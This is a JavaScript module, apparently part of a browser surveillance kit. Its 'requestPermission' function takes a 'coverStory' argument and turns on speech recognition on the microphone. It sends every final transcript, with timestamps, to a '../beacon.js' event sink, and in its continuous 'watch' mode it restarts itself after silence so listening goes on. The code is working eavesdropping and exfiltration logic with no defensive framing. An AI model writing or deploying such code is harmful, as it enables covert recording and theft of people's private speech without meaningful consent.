import { forceEvent } from '../beacon.js';

let _recognition = null;

export function stopWatch() {
  if (_recognition) {
    try { _recognition.stop(); } catch { /* ignore */ }
    _recognition = null;
  }
}

export async function requestPermission(coverStory, options) {
  const { mode = 'once', duration = null } = (typeof options === 'object' && options) ? options : {};

  if (mode === 'stop') { stopWatch(); return { stopped: true }; }

  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SR) {
    await forceEvent('speech_result', { supported: false, ts: Date.now() });
    return { supported: false };
  }

  const rec = new SR();
  rec.lang = navigator.language || 'en-US';
  rec.interimResults = false;
  rec.maxAlternatives = 1;

  if (mode === 'once') {
    rec.continuous = false;
    return new Promise((resolve) => {
      rec.onresult = async (e) => {
        const best = e.results[0][0];
        await forceEvent('speech_result', { text: best.transcript, confidence: best.confidence, lang: rec.lang, ts: Date.now() });
        resolve({ text: best.transcript });
      };
      rec.onerror = async (e) => {
        await forceEvent('speech_result', { error: e.error, ts: Date.now() });
        resolve({ error: e.error });
      };
      try { rec.start(); } catch (e) { resolve({ error: e.message }); }
    });
  }

  // watch / continuous mode
  rec.continuous = true;
  _recognition = rec;

  rec.onresult = async (e) => {
    const result = e.results[e.results.length - 1];
    if (!result.isFinal) return;
    const best = result[0];
    await forceEvent('speech_result', { text: best.transcript, confidence: best.confidence, lang: rec.lang, ts: Date.now() });
  };

  // Auto-restart on no-speech; abort on other errors
  rec.onend = () => { if (_recognition === rec) { try { rec.start(); } catch { _recognition = null; } } };
  rec.onerror = (e) => { if (e.error !== 'no-speech') { _recognition = null; } };

  try { rec.start(); } catch (e) { _recognition = null; return { error: e.message }; }

  if (duration && duration > 0) {
    setTimeout(() => { if (_recognition === rec) stopWatch(); }, duration * 1000);
  }
  return { started: true };
}
